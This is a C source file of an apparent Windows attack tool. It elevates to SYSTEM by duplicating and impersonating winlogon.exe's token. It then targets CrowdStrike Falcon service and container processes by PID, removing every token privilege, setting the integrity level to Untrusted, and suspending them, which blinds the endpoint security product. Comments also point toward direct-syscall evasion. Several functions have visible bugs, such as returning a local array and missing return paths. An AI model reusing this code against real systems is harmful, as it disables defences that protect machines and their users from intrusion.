#include <Windows.h>
#include <winternl.h>
#include <tlhelp32.h>

#include <stdio.h>

typedef LONG(NTAPI* NtSuspendProcess)(IN HANDLE ProcessHandle);
typedef LONG(NTAPI* NtResumeProcess)(IN HANDLE ProcessHandle);
typedef LONG(NTAPI* NtSetInformationToken)(IN HANDLE TokenHandle, 
    IN TOKEN_INFORMATION_CLASS TokenInformationClass, 
    IN PVOID TokenInformation, 
    IN ULONG TokenInformationLength);
typedef LONG(NTAPI* NtOpenProcessToken)(IN HANDLE ProcessHandle, 
    IN ACCESS_MASK DesiredAccess, 
    OUT PHANDLE TokenHandle);
typedef LONG(NTAPI* NtOpenProcess)(OUT PHANDLE ProcessHandle, 
    IN ACCESS_MASK AccessMask, 
    IN POBJECT_ATTRIBUTES ObjectAttributes, 
    IN _CLIENT_ID* ClientId);
typedef LONG(NTAPI* NtDuplicateToken)(
    IN HANDLE ExistingTokenHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN BOOLEAN EffectiveOnly,
    IN TOKEN_TYPE TokenType,
    OUT PHANDLE NewTokenHandle
);

// return all PIDs matching process name
DWORD* ProcessNameToPIDs(wchar_t* processName)
{
    HANDLE processes;
    DWORD pidArr[15] = { 0 };
    int counter = 0;
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    processes = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (!Process32First(processes, &entry))
    {
        wprintf(L"[!] Error!\n");
        CloseHandle(processes);
    }
    while (Process32Next(processes, &entry))
    {
        if (!wcscmp(entry.szExeFile, processName))
        {
            pidArr[counter] = entry.th32ProcessID;
            counter++;
        }
    }
    return pidArr;
}

void TryOpenProcess(int pid, int AccessRequested) {

    HANDLE hProcess = OpenProcess(AccessRequested, FALSE, pid);
    if (hProcess == NULL) {
        printf("Denied open process access mask: %X\n", AccessRequested);
    }
    else {
        printf("Allowed open process access mask: %X\n", AccessRequested);
    }
    CloseHandle(hProcess);
}


void TryOpenTokenRights(int pid, int AccessRequested) {

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (hProcess == NULL) {
        printf("Cannot get handle to process: %d\n", pid);
        return;
    }
    HANDLE hToken;
    int status = OpenProcessToken(hProcess, AccessRequested, &hToken);
    if (status == 0) { //failure
        printf("Denied token access mask: %X\n", AccessRequested);
    }
    else {
        printf("Allowed token access mask: %X\n", AccessRequested);
    }
    CloseHandle(hProcess);
}

void EnumTokenAccessRights(int pid) {
    printf("\nEnumerating token access permitted on pid %d\n", pid);

    TryOpenTokenRights(pid, TOKEN_ADJUST_DEFAULT);
    TryOpenTokenRights(pid, TOKEN_ADJUST_GROUPS);
    TryOpenTokenRights(pid, TOKEN_ADJUST_PRIVILEGES);
    TryOpenTokenRights(pid, TOKEN_ADJUST_SESSIONID);
    TryOpenTokenRights(pid, TOKEN_ASSIGN_PRIMARY);
    TryOpenTokenRights(pid, TOKEN_DUPLICATE);
    TryOpenTokenRights(pid, TOKEN_EXECUTE);
    TryOpenTokenRights(pid, TOKEN_IMPERSONATE);
    TryOpenTokenRights(pid, TOKEN_QUERY);
    TryOpenTokenRights(pid, TOKEN_QUERY_SOURCE);
    TryOpenTokenRights(pid, TOKEN_READ);
    TryOpenTokenRights(pid, TOKEN_WRITE);
    TryOpenTokenRights(pid, TOKEN_ALL_ACCESS);
}

void EnumOpenProcessRights(int pid) {

    printf("\nEnumerating access permitted on pid %d\n", pid);
    TryOpenProcess(pid, PROCESS_ALL_ACCESS);
    TryOpenProcess(pid, PROCESS_CREATE_PROCESS);
    TryOpenProcess(pid, PROCESS_CREATE_THREAD);
    TryOpenProcess(pid, PROCESS_DUP_HANDLE);
    TryOpenProcess(pid, PROCESS_QUERY_INFORMATION);
    TryOpenProcess(pid, PROCESS_QUERY_LIMITED_INFORMATION);
    TryOpenProcess(pid, PROCESS_SET_INFORMATION);
    TryOpenProcess(pid, PROCESS_SET_QUOTA);
    TryOpenProcess(pid, PROCESS_SUSPEND_RESUME);
    TryOpenProcess(pid, PROCESS_TERMINATE);
    TryOpenProcess(pid, PROCESS_VM_OPERATION);
    TryOpenProcess(pid, PROCESS_VM_READ);
    TryOpenProcess(pid, PROCESS_VM_WRITE);
    TryOpenProcess(pid, SYNCHRONIZE); 

    TryOpenProcess(pid, DELETE);
    TryOpenProcess(pid, READ_CONTROL);
    TryOpenProcess(pid, WRITE_DAC);
    TryOpenProcess(pid, WRITE_OWNER);

}

//calls NtSuspendProcess on a given PID
BOOL SuspendProc(DWORD pid) {

    //get minimal required handle
    HANDLE hProcess = OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, pid);
    if (hProcess == NULL) {
        printf("Denied access to process: %d\n", pid);
        return false;
    }

    //try to suspend
    HMODULE ntdll = GetModuleHandleW(L"ntdll");
    if (ntdll != NULL)
    {
        NtSuspendProcess pNtSuspendProcess = (NtSuspendProcess)GetProcAddress(ntdll, "NtSuspendProcess");
        if (pNtSuspendProcess == NULL) {
            printf("Error resolving NtSuspendProcess");
            return false;
        }

        NTSTATUS status = pNtSuspendProcess(hProcess);
        if (status != 0) {
            printf("NtSuspendProcess status: %X\n", status);
            return false;
        }
        printf("Process %d suspended\n", pid);
        CloseHandle(hProcess);
        FreeLibrary(ntdll);
        return true;
    }    
}

int getpid(LPCWSTR procname) {

    DWORD procPID = 0;
    LPCWSTR processName = L"";
    PROCESSENTRY32 processEntry = { 0 };
    processEntry.dwSize = sizeof(PROCESSENTRY32);


    // replace this with Ntquerysystemapi
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, procPID);
    if (Process32First(snapshot, &processEntry))
    {
        while (_wcsicmp(processName, procname) != 0)
        {
            Process32Next(snapshot, &processEntry);
            processName = processEntry.szExeFile;
            procPID = processEntry.th32ProcessID;
        }
        printf("[+] Got target proc PID: %d\n", procPID);
    }

    CloseHandle(snapshot);
    return procPID;
}


BOOL ResumeProc(DWORD pid) {

    //get minimal required handle
    HANDLE hProcess = OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, pid);
    if (hProcess == NULL) {
        printf("Denied access to process: %d\n", pid);
        return false;
    }

    //try to suspend
    HMODULE ntdll = GetModuleHandleW(L"ntdll");
    if (ntdll != NULL)
    {
        NtResumeProcess pNtResumeProcess = (NtResumeProcess)GetProcAddress(ntdll, "NtResumeProcess");
        if (pNtResumeProcess == NULL) {
            printf("Error resolving NtResumeProcess");
            return false;
        }

        NTSTATUS status = pNtResumeProcess(hProcess);
        if (status != 0) {
            printf("NtResumeProcess status: %X\n", status);
            return false;
        }
        printf("Process %d resumed\n", pid);
        CloseHandle(hProcess);
        FreeLibrary(ntdll);
        return true;
    }
}

BOOL SetPrivilege(
    HANDLE hToken,          // access token handle
    LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
    BOOL bEnablePrivilege   // to enable or disable privilege
)
{
    wprintf(L"Removing privilege: %s\n", lpszPrivilege);
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(
        NULL,            // lookup privilege on local system
        lpszPrivilege,   // privilege to lookup 
        &luid))        // receives LUID of privilege
    {
        printf("LookupPrivilegeValue error: %u\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;

    // Enable the privilege or disable all privileges.

    int status = AdjustTokenPrivileges(
        hToken,
        FALSE,
        &tp,
        sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL);

    if (status == 0)
    {
        printf("AdjustTokenPrivileges error: %u\n", GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

    {
        printf("The token does not have the specified privilege. \n");
        return FALSE;
    }
    wprintf(L"AdjustTokenPrivilege %s success\n", lpszPrivilege);
    return TRUE;
}

/// <summary>
/// Sets token integirty to Untrusted
/// </summary>
/// <param name="pid"></param>
/// <returns></returns>
BOOL LowerTokenIntegrityLevel(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (hProcess == NULL) {
        printf("Denied access to process: %d\n", pid);
        return false;
    }
    HANDLE hToken;
    int status = OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken);
    if (status == 0) {
        printf("Denied access to token on PID %d\n", pid);
        return false;
    }

    //NtSetInformationToken
    HMODULE ntdll = GetModuleHandleW(L"ntdll");
    if (ntdll != NULL)
    {
        NtSetInformationToken pNtNtSetInformationToken = (NtSetInformationToken)GetProcAddress(ntdll, "NtSetInformationToken");
        if (pNtNtSetInformationToken == NULL) {
            printf("Error resolving NtSuspendProcess");
            return false;
        }

        SID integrityLevelSid = { 0 };
        DWORD integrityLevel = SECURITY_MANDATORY_UNTRUSTED_RID;

        integrityLevelSid.Revision = SID_REVISION;
        integrityLevelSid.SubAuthorityCount = 1;
        integrityLevelSid.IdentifierAuthority.Value[5] = 16;
        integrityLevelSid.SubAuthority[0] = integrityLevel;

        TOKEN_MANDATORY_LABEL tokenIntegrityLevel = { 0 };
        tokenIntegrityLevel.Label.Attributes = SE_GROUP_INTEGRITY;
        tokenIntegrityLevel.Label.Sid = &integrityLevelSid;

        NTSTATUS status = pNtNtSetInformationToken(hToken, TokenIntegrityLevel, &tokenIntegrityLevel, sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(&integrityLevelSid));
        if (status != 0) {
            printf("Failed to Set Token Information. Err Code: %lx", status);
        }
        printf("NtSetInformationToken completed successfully\n");
        FreeModule(ntdll);
    }
}

// Removes permissions from a process token
BOOL RemoveTokenPermissions(DWORD pid) {
    //get minimal required handle
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (hProcess == NULL) {
        printf("Denied access to process: %d\n", pid);
        return false;
    }
    HANDLE hToken;
    int status = OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken);
    if (status == 0) {
        printf("Denied access to token on PID %d\n", pid);
        return false;
    }

    DWORD nOutBuf = 0;
    PTOKEN_PRIVILEGES nullToken;

    // Remove all privileges
    SetPrivilege(hToken, SE_DEBUG_NAME, FALSE);
    SetPrivilege(hToken, SE_CHANGE_NOTIFY_NAME, FALSE);
    SetPrivilege(hToken, SE_TCB_NAME, FALSE);
    SetPrivilege(hToken, SE_IMPERSONATE_NAME, FALSE);
    SetPrivilege(hToken, SE_LOAD_DRIVER_NAME, FALSE);
    SetPrivilege(hToken, SE_RESTORE_NAME, FALSE);
    SetPrivilege(hToken, SE_BACKUP_NAME, FALSE);
    SetPrivilege(hToken, SE_AUDIT_NAME, FALSE);
    SetPrivilege(hToken, SE_SECURITY_NAME, FALSE);
    SetPrivilege(hToken, SE_SYSTEM_ENVIRONMENT_NAME, FALSE);
    SetPrivilege(hToken, SE_INCREASE_QUOTA_NAME, FALSE);
    SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, FALSE);
    SetPrivilege(hToken, SE_INC_BASE_PRIORITY_NAME, FALSE);
    SetPrivilege(hToken, SE_SHUTDOWN_NAME, FALSE);
    SetPrivilege(hToken, SE_ASSIGNPRIMARYTOKEN_NAME, FALSE);
    SetPrivilege(hToken, SE_TCB_NAME, FALSE);
    SetPrivilege(hToken, SE_PROF_SINGLE_PROCESS_NAME, FALSE);
    SetPrivilege(hToken, SE_DEBUG_NAME, FALSE);
    SetPrivilege(hToken, SE_CREATE_GLOBAL_NAME, FALSE);
    SetPrivilege(hToken, SE_CREATE_PAGEFILE_NAME, FALSE);
    SetPrivilege(hToken, SE_CREATE_PERMANENT_NAME, FALSE);
    SetPrivilege(hToken, SE_CREATE_SYMBOLIC_LINK_NAME, FALSE);
    SetPrivilege(hToken, SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME, FALSE);
    SetPrivilege(hToken, SE_LOCK_MEMORY_NAME, FALSE);
    SetPrivilege(hToken, SE_SYSTEM_PROFILE_NAME, FALSE);
    SetPrivilege(hToken, SE_TIME_ZONE_NAME, FALSE);
    SetPrivilege(hToken, SE_INCREASE_QUOTA_NAME, FALSE);
    
    status = AdjustTokenPrivileges(hToken, TRUE, NULL, 0, NULL, NULL);
    if (status == 0) {
        printf("Error adjusting token permissions\n");
        return false;
    }
    printf("AdjustTokenPrivileges success!\n");

    LowerTokenIntegrityLevel(pid);

    CloseHandle(hProcess);
    return true;
}

HANDLE impersonateToken(int pid) {

    NTSTATUS status = 0;
    HANDLE hImpersonationTarget = NULL;
    HANDLE hImpersonationToken = NULL;
    OBJECT_ATTRIBUTES objAttrs = { 0 };
    CLIENT_ID clientId = { 0 };
    clientId.UniqueProcess = ULongToHandle(pid);

    HMODULE ntdll = GetModuleHandleW(L"ntdll");
    if (ntdll == NULL)
    {
        printf("error\n");
        return NULL;
    }

    NtOpenProcess pNtOpenProcess = (NtOpenProcess)GetProcAddress(ntdll, "NtOpenProcess");
    if (pNtOpenProcess == NULL) {
        printf("Error resolving NtOpenProcess");
        return NULL;
    }

    NtOpenProcessToken pNtOpenProcessToken = (NtOpenProcessToken)GetProcAddress(ntdll, "NtOpenProcessToken");
    if (pNtOpenProcessToken == NULL) {
        printf("Error resolving NtSuspendProcess");
        return NULL;
    }

    status = pNtOpenProcess(&hImpersonationTarget, PROCESS_QUERY_INFORMATION, &objAttrs, &clientId);
    if (status) {
        printf("[-] Could not open handle of impersonation target w/ PID: %d. Err Code %lx\n", pid, status);
        return NULL;
    }

    status = pNtOpenProcessToken(hImpersonationTarget, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &hImpersonationToken);
    if (status) {
        printf("[-] Failed to open token handle of impersonation target w/ PID: %d. Err Code %lx\n", pid, status);
        return NULL;
    }

    OBJECT_ATTRIBUTES objAttrs2 = { 0 };
    SECURITY_QUALITY_OF_SERVICE SQOS = { 0 };
    SQOS.ImpersonationLevel = SecurityImpersonation;
    SQOS.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
    SQOS.ContextTrackingMode = 0;
    SQOS.EffectiveOnly = FALSE;

    objAttrs2.SecurityQualityOfService = &SQOS;
    InitializeObjectAttributes(&objAttrs2, NULL, 0, NULL, NULL);
    HANDLE duppedToken = NULL;


    NtDuplicateToken pNtDuplicateToken = (NtDuplicateToken)GetProcAddress(ntdll, "NtDuplicateToken");
    if (pNtDuplicateToken == NULL) {
        printf("Error resolving NtSuspendProcess");
        return false;
    }
    status = pNtDuplicateToken(hImpersonationToken, TOKEN_ALL_ACCESS, &objAttrs2, FALSE, TokenPrimary, &duppedToken); //using TokenImpersonate works for setting thread context to token. TokenPrimary works for functions like ImpersonateLoggedOnUser etc.
    if (status) {
        printf("[-] Failed to duplicate token of process w/ PID: %d. Err Code %lx\n", pid, status);
        return NULL;
    }

    //if (!DuplicateTokenEx(hImpersonationToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duppedToken))
    //{
    //    DWORD LastError = GetLastError();
    //    wprintf(L"Error: Could not duplicate process token [%d]\n", LastError);
    //    return 1;
    //}

    return duppedToken;
}


BOOL ElevateToSystem() {
    printf("Attempting to elevate local process to SYSTEM\n");
    //Enable debug privilegs for local process
    HANDLE hCurrent = GetCurrentProcess();
    HANDLE hToken;
    int status = OpenProcessToken(hCurrent, TOKEN_ALL_ACCESS, &hToken);
    SetPrivilege(hToken, SE_DEBUG_NAME, TRUE);
    SetPrivilege(hToken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);

    printf("[*] Attmpting Token Impersonation of winlogon service.\n");
    wchar_t impersonationTarget[80] = L"winlogon.exe";
    int impersonationPid = getpid(impersonationTarget);
    HANDLE hImpersonatedProcToken = NULL;

    hImpersonatedProcToken = impersonateToken(impersonationPid);
    BOOL res = FALSE;
    res = ImpersonateLoggedOnUser(hImpersonatedProcToken); // this works to impersonate SYSTEM & set processes to untrusted within the currently running context. However, I need to figure out a way to eumulate this using NtSetInformationThread b/c that's the native API that gets called.
    if (!res) {
        DWORD lasterror;
        lasterror = GetLastError();
        wprintf(L"SetThreadToken: %d", lasterror);
        return FALSE;
    }

    //advapi32.dll setThreadToken -> kernelbase -> NtSetInformationThread.
    //advapi32.dll ImpersonateLoggedOnUser -> kernelbase -> NtSetInformationThread.
    //NTSTATUS status = 0;
    //HellsGate(table.NtSetInformationThread.wSystemCall);
    //status = HellDescent(GetCurrentThread(), ThreadImpersonationToken, (PVOID)&hImpersonatedProcToken, 8);
    //if (status) {
    //    printf("[-] Failed to impersonate token on current thread. Err Code %lx\n", status);
    //    return 0;
    //}
    printf("[*] Successfully impersonated winlogon service.\n");
    return TRUE;
}

int main()
{
    int CsFalconServicePid = 3328;
    int CsFalconContainerPid1 = 3888;
    int CsFalconContainerPid2 = 4920;

    EnumTokenAccessRights(CsFalconServicePid);
    ElevateToSystem();
    EnumTokenAccessRights(CsFalconServicePid);


    RemoveTokenPermissions(CsFalconServicePid);
    
    RemoveTokenPermissions(CsFalconContainerPid1);
    RemoveTokenPermissions(CsFalconContainerPid1);

    return 0;

    /*DWORD * pids1 = ProcessNameToPIDs(L"CSFalconService.exe");
    for (int i = 0; i < 15; i++) {
        if (pids1[i] == 0) {
            break;
        }
        else {
            printf("PID: %d\n", pids1[i]);
        }
    }
    DWORD * pids2 = ProcessNameToPIDs(L"CSFalconContainer.exe");
    for (int i = 0; i < 15; i++) {
        if (pids1[i] == 0) {
            break;
        }
        else {
            printf("PID: %d\n", pids1[i]);
        }
    }*/

    

    SuspendProc(CsFalconServicePid);
    SuspendProc(CsFalconContainerPid1);
    SuspendProc(CsFalconContainerPid2);

    return 0;
}
